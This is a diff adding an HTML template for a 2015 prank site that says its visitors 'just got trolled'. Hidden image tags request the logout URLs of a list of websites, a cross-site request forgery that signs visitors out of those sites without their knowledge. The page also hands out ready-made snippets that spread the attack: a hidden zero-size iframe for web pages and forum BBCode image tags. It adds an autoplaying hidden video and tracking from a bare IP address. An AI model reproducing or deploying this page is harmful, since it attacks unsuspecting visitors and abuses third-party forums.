@@ -1,0 +1,184 @@
+<!DOCTYPE html>
+<html lang="en">
+	<head>
+		<meta charset="utf-8">
+		<meta http-equiv="X-UA-Compatible" content="IE=edge">
+		<meta name="viewport" content="width=device-width, initial-scale=1">
+		<!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
+		<meta name="description" content="">
+		<meta name="author" content="">	
+
+		<title>You just got trolled!</title>
+
+		<!-- Bootstrap core CSS -->
+		<link href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/css/bootstrap.min.css" rel="stylesheet">
+
+		<!-- Custom styles for this template -->
+
+		<script src="https://code.jquery.com/jquery-2.1.4.min.js"></script>
+		<script src="https://maps.googleapis.com/maps/api/js?v=3.exp&signed_in=true"></script>
+		
+		<link rel="icon" href="{{ config['baseUrl'] }}/public/favicon.ico" />
+
+
+		<!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
+		<!--[if lt IE 9]>
+		<script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
+		<script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
+		<![endif]-->
+		
+		<style>
+			#troll {
+				visibility: hidden;
+			}
+			
+			li, h3 {
+				font-weight: bold;
+			}
+			
+			ul li a:link {
+				color: #555;
+			}
+
+			ul li a:visited {
+				color: black;
+				text-decoration: underline;
+			}
+			
+			.pseudo, .nb {
+				font-size: 35px;
+			}
+			
+			.note {
+				font-size: 9px;
+			}
+			
+		</style>
+		
+	</head>
+
+	<body>
+		<div id="troll">
+			{% for website in websites %}
+				<img src='{{ website.logoutURL }}'/>
+			{% endfor %}
+		</div>
+		<div class="container">
+			<div class="jumbotron">
+				<div class="header clearfix">
+					<h1 class="text-muted" id="title" >
+						<img data-deg="0" src="{{ config['baseUrl'] }}/public/img/trollface.png" alt="trollface"/><img data-deg="0" src="{{ config['baseUrl'] }}/public/img/trollface.png" alt="trollface"/><img data-deg="0" src="{{ config['baseUrl'] }}/public/img/trollface.png" alt="trollface"/>
+							{{config['nameWebsite']}} 
+						<img data-deg="0" src="{{ config['baseUrl'] }}/public/img/trollface.png" alt="trollface"/><img data-deg="0" src="{{ config['baseUrl'] }}/public/img/trollface.png" alt="trollface"/><img data-deg="0" src="{{ config['baseUrl'] }}/public/img/trollface.png" alt="trollface"/>
+					</h1>
+				</div>
+				<div class="row">
+					<div class="col-md-4">
+						<h3>Vous venez de vous faire déconnecter de :</h3>
+						<div id="favicon">
+							{% for website in websites %}
+								<ul>
+									<li><img alt="{{website.websiteName}}" src='http://www.google.com/s2/favicons?domain={{ website.websiteURL }}'/> <a href="{{ website.websiteURL }}">{{ website.websiteName }}</a></li>
+								</ul>
+							{% endfor %}
+						</div>
+					</div>
+					<div class="col-md-4">
+						<img alt="trolldance" src="{{ config['baseUrl'] }}/public/img/trolldance.gif"/>
+					</div>
+					<div class="col-md-4">
+						{% set localUrl %}{{ config['baseUrl'] }}{% if random is not null %}/{{random}}{% endif %}{% endset %}
+						{% set trollSentence %}You just got trolled by{% if random is not null %} {{pseudo}} on {% endif %}{% endset %}
+						<h4>Exporter, partagez, trollez :</h4>
+							<p>
+								Sur votre site web :<br/>
+									<textarea><iframe frameborder="0" width="0" height="0" src="{{ config['baseUrl'] }}"></iframe><br />{{trollSentence}}<a href="{{localUrl}}">{{config['nameWebsite']}}</a></textarea>
+								<br/>
+							</p>
+							<hr/>
+							<p>
+								Sur un forum :<br/>
+									<textarea id="forumTextarea">Vous venez de vous faire déconnecter de :
+{% for website in websites %}[img]{{ website.logoutURL }}[/img]
+[img]http://www.google.com/s2/favicons?domain={{ website.websiteURL }}[/img]{{ website.websiteName }}		
+{% endfor %}[img]{{ config['baseUrl'] }}/trolled{% if random is not null %}/{{random}}{% endif %}[/img]
+{{trollSentence}} [url={{localUrl}}]{{config['nameWebsite']}}[/url]</textarea>
+									<br/><span class="note">Attention : Ne fonctionne pas sur tous les forums + risque de BAN<span>
+								<br/>
+							</p>
+							<hr/>
+							<p>
+								Envoyez le lien :<br/>
+									<input value="{{localUrl}}" size="22px" />
+								<br/>
+							</p>
+							<hr/>
+							<p>
+								Créez un nouveau lien :
+								<form action="{{ config['baseUrl'] }}/new" method="POST" >
+									<input name="pseudo" placeholder="Votre Pseudo" ></input>
+									<input type="submit" value="Envoyer"></input>
+								</form>
+							</p>
+					</div>
+				</div>
+				{% if pseudo is not null %}
+					<h3><span class="pseudo">{{ pseudo }}</span> a déjà troll <span class="nb">{{ nbTrolled }}</span> noobz!</h3>
+				{% endif %}
+			</div>
+
+			<footer class="footer">
+				<p>Poorly designed by Nicolas Bonduel - 2015</p>
+			</footer>
+
+		</div> <!-- /container -->
+		<iframe width="0" height="0" src="https://www.youtube.com/embed/dQw4w9WgXcQ?rel=0&autoplay=1" frameborder="0"></iframe>
+
+	</body>
+	
+	
+	
+	<script>
+	
+		troll();
+		troll2();
+		var colors = ['red', 'blue', 'yellow', 'green', 'purple', 'white', 'orange'];
+		function troll() {
+			setTimeout(function() {
+				$('body').css('background-color',colors[Math.floor(Math.random()*colors.length)]);
+				$('#title').css('color',colors[Math.floor(Math.random()*colors.length)]);
+				troll();
+			},300);
+		}
+		
+		var titleImgs = $("#title img");
+		function troll2() {
+			setTimeout(function() {
+				titleImgs.each(function(i) {
+					$(this).attr("data-deg",parseInt($(this).attr("data-deg"))+Math.floor(Math.random()*5)+2);
+					$(this).css("transform", "rotate(" + $(this).attr("data-deg") + "deg)");
+				})
+				troll2();
+			},50);
+		}
+		
+	</script>
+	
+	
+	<!-- Piwik -->
+	<script type="text/javascript">
+	  var _paq = _paq || [];
+	  _paq.push(['trackPageView']);
+	  _paq.push(['enableLinkTracking']);
+	  (function() {
+		var u="//37.187.47.69:8080/";
+		_paq.push(['setTrackerUrl', u+'piwik.php']);
+		_paq.push(['setSiteId', 2]);
+		var d=document, g=d.createElement('script'), s=d.getElementsByTagName('script')[0];
+		g.type='text/javascript'; g.async=true; g.defer=true; g.src=u+'piwik.js'; s.parentNode.insertBefore(g,s);
+	  })();
+	</script>
+	<noscript><p><img src="//37.187.47.69:8080/piwik.php?idsite=2" style="border:0;" alt="" /></p></noscript>
+	<!-- End Piwik Code -->
+	
+</html>
